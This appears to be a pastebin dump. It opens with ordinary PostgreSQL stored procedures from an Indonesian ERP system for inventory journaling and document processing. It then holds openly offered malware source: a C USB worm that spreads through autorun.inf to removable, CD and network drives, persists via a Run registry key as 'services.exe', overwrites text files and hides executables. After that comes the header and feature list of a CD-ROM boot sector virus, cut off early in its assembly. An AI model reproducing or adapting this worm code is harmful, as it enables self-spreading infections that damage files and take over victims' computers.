	  	SELECT vJournalTrxId, A.tenant_id, (vDocJournal).journal_type, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date,
	  		(vOuStructure).ou_bu_id, (vOuStructure).ou_branch_id, (vOuStructure).ou_sub_bu_id, A.partner_id, vEmptyId, A.warehouse_from_id, A.ext_doc_no, A.ext_doc_date,
	  		A.ref_doc_type_id, A.ref_id, A.doc_date, f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), A.remark, vStatusDraft, 'DRAFT',
	  		0, vDatetime, vUserId, vDatetime, vUserId
	  	FROM in_inventory A
	  	WHERE A.inventory_id = vAdjQtyId;
	  	
		INSERT INTO tt_journal_trx_item
		(session_id, tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark)
		SELECT pSessionId, A.tenant_id, vJournalTrxId, 1, 
			A.doc_type_id, B.inventory_item_id,
			A.partner_id, B.product_id, vEmptyId, vEmptyId,
			vEmptyId, vSignDebit, vProductCOA, vEmptyId,
			f_get_product_coa_group_product(A.tenant_id, B.product_id), f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), B.qty_realization, B.base_uom_id,
			0 , A.doc_date, vTypeRate,
			1, 1, 'PRODUCT_STOCK', B.remark
		FROM in_inventory A, in_inventory_item B
		WHERE A.inventory_id = vAdjQtyId AND
			A.inventory_id = B.inventory_id AND
			B.qty_realization > 0 AND
			NOT EXISTS (SELECT 1 FROM m_product_custom C
						WHERE B.product_id = C.product_id AND 
							C.flg_buy_konsinyasi = vFlagYes);
			
		INSERT INTO tt_journal_trx_item
		(session_id, tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark)
		SELECT pSessionId, A.tenant_id, vJournalTrxId, 1, 
			A.doc_type_id, B.inventory_item_id,
			A.partner_id, B.product_id, vEmptyId, vEmptyId,
			vEmptyId, vSignCredit, vProductCOA, vEmptyId,
			f_get_product_coa_group_product(A.tenant_id, B.product_id), f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), ABS(B.qty_realization), B.base_uom_id,
			0 , A.doc_date, vTypeRate,
			1, 1, 'PRODUCT_STOCK', B.remark
		FROM in_inventory A, in_inventory_item B
		WHERE A.inventory_id = vAdjQtyId AND
			A.inventory_id = B.inventory_id AND
			B.qty_realization < 0 AND
			NOT EXISTS (SELECT 1 FROM m_product_custom C
						WHERE B.product_id = C.product_id AND 
							C.flg_buy_konsinyasi = vFlagYes);
	/*
	 * NK, 1 Feb 2014
	 * jurnal activity gl tidak di break down per product
	 */		
		INSERT INTO tt_journal_trx_item
		(session_id, tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark)
		SELECT pSessionId, A.tenant_id, vJournalTrxId, 1, 
			vEmptyId, vEmptyId,
			vEmptyId, vEmptyId, vEmptyId, A.ou_rc_id,
	-- NK, 1 September 2014 - add segment_id				
			A.segment_id, vSignCredit, vActivityCOA, A.activity_gl_id,
			D.coa_id, f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), 0, vEmptyId,
			0 , A.doc_date, vTypeRate,
			1, 1, 'ADJUSMENT_STOCK', vEmptyValue
		FROM in_inventory A, m_activity_gl D
		WHERE A.inventory_id = vAdjQtyId AND 
			A.activity_gl_id = D.activity_gl_id;
	
	/*		
		INSERT INTO tt_journal_trx_item
		(session_id, tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark)
		SELECT pSessionId, A.tenant_id, vJournalTrxId, 1, 
			A.doc_type_id, B.inventory_item_id,
			A.partner_id, B.product_id, vEmptyId, vEmptyId,
			vEmptyId, vSignCredit, vActivityCOA, A.ou_rc_id,
			D.coa_id, f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), B.qty_realization, B.base_uom_id,
			0 , A.doc_date, vTypeRate,
			1, 1, 'ADJUSMENT_STOCK', B.remark
		FROM in_inventory A, in_inventory_item B, m_activity_gl D
		WHERE A.inventory_id = vAdjQtyId AND 
			A.inventory_id = B.inventory_id AND
			B.qty_realization > 0 AND
			A.activity_gl_id = D.activity_gl_id;
	
		INSERT INTO tt_journal_trx_item
		(session_id, tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark)
		SELECT pSessionId, A.tenant_id, vJournalTrxId, 1, 
			A.doc_type_id, B.inventory_item_id,
			A.partner_id, B.product_id, vEmptyId, vEmptyId,
			vEmptyId, vSignDebit, vActivityCOA, A.ou_rc_id,
			D.coa_id, f_get_value_system_config_by_param_code(pTenantId, 'ValutaBuku'), B.qty_realization, B.base_uom_id,
			0 , A.doc_date, vTypeRate,
			1, 1, 'ADJUSMENT_STOCK', B.remark
		FROM in_inventory A, in_inventory_item B, m_activity_gl D
		WHERE A.inventory_id = vAdjQtyId AND 
			A.inventory_id = B.inventory_id AND
			B.qty_realization < 0 AND
			A.activity_gl_id = D.activity_gl_id;
	*/
		INSERT INTO gl_journal_trx_item
		(tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark,
		""version"", create_datetime, create_user_id, update_datetime, update_user_id,
		ou_branch_id, ou_sub_bu_id)
		SELECT A.tenant_id, A.journal_trx_id, ROW_NUMBER() OVER ( PARTITION BY A.journal_trx_id), 
			A.ref_doc_type_id, A.ref_id,
			A.partner_id, A.product_id, A.cashbank_id, A.ou_rc_id,
			A.segmen_id, A.sign_journal, A.flg_source_coa, A.activity_gl_id,
			A.coa_id, A.curr_code, A.qty, A.uom_id,
			A.amount, A.journal_date, A.type_rate,
			A.numerator_rate, A.denominator_rate, A.journal_desc, A.remark,
			0, vDatetime, vUserId, vDatetime, vUserId,
			(vOuStructureJournalItem).ou_branch_id, (vOuStructureJournalItem).ou_sub_bu_id
		FROM tt_journal_trx_item A
		WHERE A.session_id = pSessionId AND
			A.journal_desc = 'PRODUCT_STOCK';
			
		INSERT INTO gl_journal_trx_mapping
		(tenant_id, journal_trx_id, line_no, 
		ref_doc_type_id, ref_id,
		partner_id, product_id, cashbank_id, ou_rc_id,
		segmen_id, sign_journal, flg_source_coa, activity_gl_id,
		coa_id, curr_code, qty, uom_id,
		amount, journal_date, type_rate, 
		numerator_rate, denominator_rate, journal_desc, remark,
		""version"", create_datetime, create_user_id, update_datetime, update_user_id)
		SELECT A.tenant_id, A.journal_trx_id, ROW_NUMBER() OVER ( PARTITION BY A.journal_trx_id), 
			A.ref_doc_type_id, A.ref_id,
			A.partner_id, A.product_id, A.cashbank_id, A.ou_rc_id,
			A.segmen_id, A.sign_journal, A.flg_source_coa, A.activity_gl_id,
			A.coa_id, A.curr_code, A.qty, A.uom_id,
			A.amount, A.journal_date, A.type_rate,
			A.numerator_rate, A.denominator_rate, A.journal_desc, A.remark,
			0, vDatetime, vUserId, vDatetime, vUserId
		FROM tt_journal_trx_item A
		WHERE A.session_id = pSessionId AND
			A.journal_desc = 'ADJUSMENT_STOCK';
	
		DELETE FROM tt_journal_trx_item WHERE session_id = pSessionId;
	END IF;
	DELETE FROM tt_in_product_balance WHERE session_id = pSessionId;
	
	-- Ubah status item menjadi final approved
	SELECT A.ref_doc_type_id, A.ref_id INTO vRefDocTypeId, vRefId
	FROM in_inventory A
	INNER JOIN in_inventory_item B ON A.inventory_id = B.inventory_id
	WHERE A.inventory_id = vAdjQtyId;
		IF vRefDocTypeId = vStockOpnameDoc THEN
			UPDATE in_stock_opname_item_balance 
				SET status_item = vFinalTransaction
				WHERE stock_opname_result_id = vRefId;
		END IF;
	-- end update status item
	
END;
$BODY$;

ALTER FUNCTION in_submit_adjusment_qty(bigint, character varying, character varying)
    OWNER TO sts;
"
p62P24BS,generate_process_message_for_submit_doc,abirama62,PostgreSQL,Tuesday 4th of July 2023 11:29:00 PM CDT,"CREATE OR REPLACE FUNCTION generate_process_message_for_submit_doc(
	character varying,
	bigint,
	character varying,
	character varying,
	character varying,
	character varying,
	character varying,
	bigint)
    RETURNS void
    LANGUAGE 'plpgsql'
    COST 100
    VOLATILE PARALLEL UNSAFE
AS $BODY$
DECLARE
    pSessionId			ALIAS FOR $1;
    pTenantId			ALIAS FOR $2;
    pProcessName		ALIAS FOR $3;
    pProcessNo			ALIAS FOR $4;
    pProcessDatetime	ALIAS FOR $5;
    pParamKey1			ALIAS FOR $6;
    pParamValue1		ALIAS FOR $7;
    pUserValue			ALIAS FOR $8;
    
	vProcessMessageId		bigint;
	vCount			character varying(1);
BEGIN
	
	INSERT INTO t_process_message
	(process_message_id, process_name, process_no, tenant_id,
	process_create_datetime, process_queue_datetime, process_finish_datetime, process_status,
	version, create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT nextval('process_message_seq'), pProcessName, pProcessNo, pTenantId,
		pProcessDatetime,' ',' ', 'M',
		0, pProcessDatetime, -1, pProcessDatetime, -1;

	SELECT process_message_id INTO vProcessMessageId
	FROM t_process_message A
	WHERE process_no = pProcessNo AND
		process_name = pProcessName AND
		tenant_id = pTenantId;

	INSERT INTO t_process_parameter
	(process_parameter_id, process_message_id, 
	process_parameter_key, process_parameter_value,
	version, create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT nextval('process_parameter_seq'), vProcessMessageId,
		pParamKey1, pParamValue1,
		0, pProcessDatetime, -1, pProcessDatetime, -1;
		
	INSERT INTO t_process_parameter
	(process_parameter_id, process_message_id, 
	process_parameter_key, process_parameter_value,
	version, create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT nextval('process_parameter_seq'), vProcessMessageId,
		'userId', pUserValue,
		0, pProcessDatetime, -1, pProcessDatetime, -1;
			
	INSERT INTO t_process_parameter
	(process_parameter_id, process_message_id, 
	process_parameter_key, process_parameter_value,
	version, create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT nextval('process_parameter_seq'), vProcessMessageId,
		'datetime', pProcessDatetime,
		0, pProcessDatetime, -1, pProcessDatetime, -1;
		
	IF pProcessName = 'pu_submit_po' THEN

		SELECT pu_submit_po(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'pu_submit_receive_goods' THEN

		SELECT pu_submit_receive_goods(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'pu_submit_purch_invoice' THEN

		SELECT pu_submit_purch_invoice(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'in_submit_claim_note' THEN

		SELECT in_submit_claim_note(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'pu_submit_return_purch_invoice' THEN

		SELECT pu_submit_return_purch_invoice(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'sl_submit_so' THEN

		SELECT sl_submit_so(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'sl_submit_do' THEN

		SELECT sl_submit_do(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'sl_submit_sales_invoice' THEN
 
		SELECT sl_submit_sales_invoice(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'in_submit_transfer_out' THEN

		SELECT in_submit_transfer_out(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'in_submit_transfer_in' THEN

		SELECT in_submit_transfer_in(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'fi_submit_invoice_ap' THEN

		SELECT fi_submit_invoice_ap(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'pu_submit_modify_header_po' THEN

		SELECT pu_submit_modify_header_po(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'pu_submit_modify_item_po' THEN

		SELECT pu_submit_modify_item_po(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'sl_submit_modify_header_so' THEN

		SELECT sl_submit_modify_header_so(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'sl_submit_modify_item_so' THEN

		SELECT sl_submit_modify_item_so(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'fi_submit_alloc_credit_ar' THEN

		SELECT fi_submit_alloc_credit_ar(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
	
	ELSIF pProcessName = 'fi_submit_alloc_debt_ap' THEN

		SELECT fi_submit_alloc_debt_ap(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_request_cash_advance' THEN

		SELECT cb_submit_request_cash_advance(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_cash_advance_settlement' THEN

		SELECT cb_submit_cash_advance_settlement(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_follow_up_advance_settlement' THEN

		SELECT cb_submit_follow_up_advance_settlement(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'in_submit_adjusment_qty' THEN

		SELECT in_submit_adjusment_qty(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;	
	
	ELSIF pProcessName = 'in_submit_adjusment_amount' THEN

		SELECT in_submit_adjusment_amount(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;	
		
	ELSIF pProcessName = 'fi_submit_invoice_ar' THEN

		SELECT fi_submit_invoice_ar(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_cb_in_ar' THEN

		SELECT cb_submit_cb_in_ar(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;	
		
	ELSIF pProcessName = 'fi_submit_payment_order_ap' THEN

		SELECT fi_submit_payment_order_ap(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_cb_out' THEN

		SELECT cb_submit_cb_out(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_cb_in_others' THEN

		SELECT cb_submit_cb_in_others(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_transfer_cashbank' THEN

		SELECT cb_submit_transfer_cashbank(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'fi_submit_alloc_cashbank_ar' THEN

		SELECT fi_submit_alloc_cashbank_ar(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_payment_order_cb' THEN

		SELECT cb_submit_payment_order_cb(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	ELSIF pProcessName = 'cb_submit_cg_receipt' THEN

		SELECT cb_submit_cg_receipt(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;

	ELSIF pProcessName = 'cb_submit_conversion_cbin_other_to_partner' THEN

		SELECT cb_submit_conversion_cbin_other_to_partner(pTenantId, pSessionId, pProcessNo) INTO vCount;

		UPDATE t_process_message SET process_status='S'
		WHERE process_message_id = vProcessMessageId;
		
	END IF;
 
	
END;
$BODY$;

ALTER FUNCTION generate_process_message_for_submit_doc(character varying, bigint, character varying, character varying, character varying, character varying, character varying, bigint)
    OWNER TO sts;
"
TiquXPjM,illuz1oN's Small Worm - Source Codes,FlyFar,C,Tuesday 4th of July 2023 11:24:32 PM CDT,"// This is for Educational Purposes only 
 
// This source code was written by illuz1oN to explain how to malware infect mass storage devices
 
// i hope this source code helps you! and thanks a lot for illuz1oN with a brilliant  mind
 
 
 
#include <windows.h>
 
 
 
#include <stdio.h>
 
 
 
#define IMSG ""|__[__]__/=+-\\ SaveItForLater :] USB <span class=""searchlite"">Worm</span> /-+=\\__[__]__|""
 
 
 
//Remember this part!  We'll see it later
 
 
 
char me[1024];
 
 
 
HKEY hKey;
 
 
 
char *drives[] = {""C:"",""D:"",""E"",""F:"",""G:"",""H:"",""I:"",""J:"",""K:"",""L:"",
 
 
 
                  ""M:"",""N:"",""O:"",""P:"",""Q:"",""R:"",""S:"",""T:"",""U:"",""V:"",
 
 
 
                  ""W:"",""X:"",""Y:"",""Z:""};
 
 
 
//C-Z drive letters for Windows partitions
 
 
 
DWORD WINAPI spreadUSB()
 
 
 
{
 
 
 
    while(1)
 
 
 
    {
 
 
 
        Sleep(120000);
 
 
 
        int i;
 
 
 
//scan through drive letters
 
 
 
        for(i = 0;i < 24;i++)
 
 
 
        {
 
 
 
            if((GetDriveType(drives[i])) == DRIVE_REMOVABLE)
 
 
 
//DRIVE_REMOVABLE is usb, floppy, anything that's considered removable media by Microsoft
 
 
 
            {
 
 
 
                char hldPath[50];
 
 
 
                char usbFile[30] = ""\\Driver_Update.exe"";
 
 
 
                char autoRun[50] = ""[autorun]\r\nopen=Driver_Update.exe"";
 
 
 
                strcpy(hldPath,drives[i]);
 
 
 
                strcat(hldPath,""\\autorun.inf"");
 
 
 
                FILE *fp = fopen(""autorun.inf"",""w"");
 
 
 
                fprintf(fp,autoRun);
 
 
 
                fclose(fp);
 
 
 
                CopyFile(""autorun.inf"",hldPath,0);
 
 
 
                remove(""autorun.inf"");
 
 
 
                strcat(drives[i],usbFile);
 
 
 
                CopyFile(me,drives[i],0);
 
 
 
//create an autorun.inf file with this code as ""Driver_Update.exe"" and place it as a value for autorun, which would attempt to infect other computers automatically when it's inserted.
 
 
 
            }
 
 
 
            else if((GetDriveType(drives[i])) == DRIVE_CDROM)
 
 
 
            {
 
 
 
                char cdPath[50];
 
 
 
                char cdFile[20] = ""\\<span class=""searchlite"">Worm</span>_Pwn.exe"";
 
 
 
                char cdAutr[50] = ""[autorun]\r\nopen=<span class=""searchlite"">Worm</span>_Pwn.exe"";
 
 
 
                strcpy(cdPath,drives[i]);
 
 
 
                strcat(cdPath,""\\autorun.inf"");
 
 
 
                FILE *fpp = fopen(""autorun.inf"",""w"");
 
 
 
                fprintf(fpp,cdAutr);
 
 
 
                fclose(fpp);
 
 
 
                CopyFile(""autorun.inf"",cdPath,1);
 
 
 
                remove(""autorun.inf"");
 
 
 
                strcat(drives[i],cdFile);
 
 
 
                CopyFile(me,drives[i],0);
 
 
 
//same as above except with cd-rom.  Name changes, possibly because this method automatically executes no matter what, instead of user intervention like autorun.inf (depending on OS).  So no reason to SE the person.
 
 
 
            }
 
 
 
            else if((GetDriveType(drives[i])) == DRIVE_REMOTE)
 
 
 
            {
 
 
 
                char remName[20] = ""\\Upd_Config.exe"";
 
 
 
                strcat(drives[i],remName);
 
 
 
                CopyFile(me,drives[i],0);
 
 
 
//infect remote network drives and save as ""Upd_Config.exe"".  Again, name change for SE.
 
 
 
            }
 
 
 
        }
 
 
 
    }
 
 
 
}
 
 
 
BOOL Startup()
 
 
 
{
 
 
 
    char dropTo[1024];
 
 
 
    GetWindowsDirectory(dropTo,1024);
 
 
 
    strcat(dropTo,""\\services.exe"");
 
 
 
//drop (copy) --v-- file to \WINDOWS\ directory as file name services.exe
 
 
 
    if((CopyFile(me,dropTo,1)) == 0)
 
 
 
        return 0;
 
 
 
    else
 
 
 
    {
 
 
 
        if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"",0,KEY_SET_VALUE,&hKey) == ERROR_SUCCESS)
 
 
 
//if no error in dropping file, add file to Run on startup registry key
 
 
 
        {
 
 
 
            RegSetValueEx(hKey,""services"",0,REG_SZ,(const unsigned char*)dropTo,strlen(dropTo));
 
 
 
            RegCloseKey(hKey);
 
 
 
        }
 
 
 
        return 1;
 
 
 
    }
 
 
 
}
 
 
 
DWORD WINAPI changeTitle(LPVOID lParam)
 
 
 
{
 
 
 
    while(1)
 
 
 
    {
 
 
 
        HWND hWnd = GetForegroundWindow();
 
 
 
        SetWindowText(hWnd,""|__[__]__/=+-\\ SaveItForLater :] <span class=""searchlite"">Worm</span> - illuz1oN /-+=\\__[__]__|"");
 
 
 
//change Window title as this ---^---
 
 
 
    }
 
 
 
}
 
 
 
void winLogin(void)
 
 
 
{
 
 
 
    HKEY hKey;
 
 
 
    char szCaption[] = ""          |__[__]__/=+-\\ illuz1oN /-+=\\__[__]__|"";
 
 
 
    char szText[] = ""             |__[__]__/=+-\\ SaveItForLater :] <span class=""searchlite"">Worm</span> By illuz1oN /-+=\\__[__]__|""
 
 
 
                    ""\nIf you want to remove this <span class=""searchlite"">worm</span>, contact illuz1oN - ""
 
 
 
                    ""\n... AV Companies ~censored~ You ..."";
 
 
 
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,""Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"",0,KEY_SET_VALUE,&hKey);
 
 
 
    RegSetValueEx(hKey,""LegalNoticeCaption"",0,REG_SZ,(const unsigned char*)szCaption,sizeof(szCaption));
 
 
 
    RegCloseKey(hKey);
 
 
 
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,""Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"",0,KEY_SET_VALUE,&hKey);
 
 
 
    RegSetValueEx(hKey,""LegalNoticeText"",0,REG_SZ,(const unsigned char*)szText,sizeof(szText));
 
 
 
//create key name ""LegalNoticeCaption"" in the above registry hives.  Rather humerous if you ask me.
 
 
 
    RegCloseKey(hKey);
 
 
 
}
 
 
 
int WINAPI WinMain (HINSTANCE hinst,HINSTANCE prhin,LPSTR argsx,int in)
 
 
 
{
 
 
 
    GetModuleFileName(0,me,1024);
 
 
 
    CreateMutex(0,0,""-+- illuz1oN -+-"");
 
 
 
    if(GetLastError() == ERROR_ALREADY_EXISTS)
 
 
 
    {
 
 
 
        ExitProcess(0);
 
 
 
    }
 
 
 
    else
 
 
 
    {
 
 
 
        if((Startup()) == 0)
 
 
 
//if the drop (copy) did not work, execute this
 
 
 
        {
 
 
 
         char szMask[4] = ""*.*"";
 
 
 
         DWORD ret = 0;
 
 
 
         WIN32_FIND_DATA fData;
 
 
 
         HANDLE hFind,hFile;
 
 
 
         hFind = FindFirstFile(szMask,&fData);
 
 
 
         if(fData.cFileName == ""*.txt"")
 
 
 
//if file = .txt extension, continue
 
 
 
         {
 
 
 
            hFile = CreateFile(fData.cFileName,GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 
 
 
            if(hFile == INVALID_HANDLE_VALUE)
 
 
 
               ExitProcess(0);
 
 
 
            else
 
 
 
            {
 
 
 
               WriteFile(hFile,IMSG,sizeof(IMSG),&ret,0);
 
 
 
               CloseHandle(hFile);
 
 
 
//write the IMSG, remember that thing at the top?  yeah....
 
 
 
            }
 
 
 
         }
 
 
 
         else if(fData.cFileName == ""*.exe"")
 
 
 
//if .exe, set as system and hidden to not display in explorer by default.
 
 
 
         {
 
 
 
            SetFileAttributes(fData.cFileName,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
 
 
 
            CloseHandle(hFile);
 
 
 
         }           
 
 
 
         while (FindNextFile(hFind,&fData))
 
 
 
//continue searching for files with these extensions
 
 
 
         {
 
 
 
            if(fData.cFileName == ""*.txt"")
 
 
 
            {
 
 
 
               hFile = CreateFile(fData.cFileName,GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 
 
 
               if(hFile == INVALID_HANDLE_VALUE)
 
 
 
                  ExitProcess(0);
 
 
 
               else
 
 
 
               {
 
 
 
                  WriteFile(hFile,IMSG,sizeof(IMSG),&ret,0);
 
 
 
                  CloseHandle(hFile);
 
 
 
               }
 
 
 
            }         
 
 
 
            else if(fData.cFileName == ""*.exe"")
 
 
 
            {
 
 
 
               SetFileAttributes(fData.cFileName,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
 
 
 
               CloseHandle(hFile);
 
 
 
            }               
 
 
 
         }           
 
 
 
         FindClose(hFind);
 
 
 
        }
 
 
 
        else
 
 
 
        {
 
 
 
            winLogin();
 
 
 
            unsigned long title;
 
 
 
            CreateThread(0,0,changeTitle,0,0,&title);
 
 
 
            unsigned long virii;
 
 
 
            CreateThread(0,0,spreadUSB,0,0,&virii);
 
 
 
            Sleep(INFINITE);
 
 
 
        }
 
 
 
    }
 
 
 
}"
zyVXT2WA,SPTH-OS 2.0 - the world's first boot sector virus for CD-ROMs - Source Code,FlyFar,ASM (NASM),Tuesday 4th of July 2023 11:17:56 PM CDT,";  SPTH-OS 2.0
;  by Second Part To Hell/[rRlf]
;  www.spth.de.vu
;  spth@priest.com
;  written from January 2005 - April 2005
;  in Austria
;
;  What you can see below is the world's first bootsectorvirus for CD-ROMs.
;
;  The virus infects ISO-9660 El Torito Images in the Root Directory of the
;  first partition on the Harddisk. It also infects FAT12 .IMG Imagefiles.
;
;  El Torito is maybe the most often used Bootable CD-Image, and it's used by
;  for instance Ahead Nero Burning-ROM.
;
;  When the virus infects an ISO image, and the user burns this image to a
;  CD-ROM, the CD-ROM is infected, and the virus can not be removed anymore.
;  When the user now forgets the CD-ROM in the drive, and BIOS tests the
;  CD-Boot, the next images became infected.
;  
;
;  The features:
;    - First CD-ROM bootsector virus
;    - Works at CD-ROMs and floppys
;    - Own FAT32 Filesystem driver
;    - ISO-9660 El Torito Images infection
;    - FAT12 Image file infection
;
;  The differences to other bootsector virus is, that it does not use the OS's
;  functions but use it's own Filesystem driver. This was of course a lot of
;  work, but I guess that it was a success.
;
;  There is one known bug: the virus does not infect files at very huge and
;  full-trashed root directories, as it just searchs files in the first 16
;  sectors (256 entries), but this is very unusual. (But you have to know that
;  also deleted files/dirs are saved in the root directory)
;
;  Compile:
;  - - -
;  del kernel.bin
;  cls
;  fasm kernel.asm kernel.bin
;  rawrite -f kernel.bin -d A -n
;  pause
;  shutdown -r -f -t 1 -c ""SPTH-OS v2.0""
;  - - -
;
;  Well, the first prove-of-concept CD-ROM bootsector virus has been writen,
;  now let's move to other projects...
;
;
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

	org 0x7c00				; Offsets + 0x7C00, as the bootsector will be loaded at 0x7C00
stfat:
 jmp		 startboot			; Jump over FAT12 table
 nop
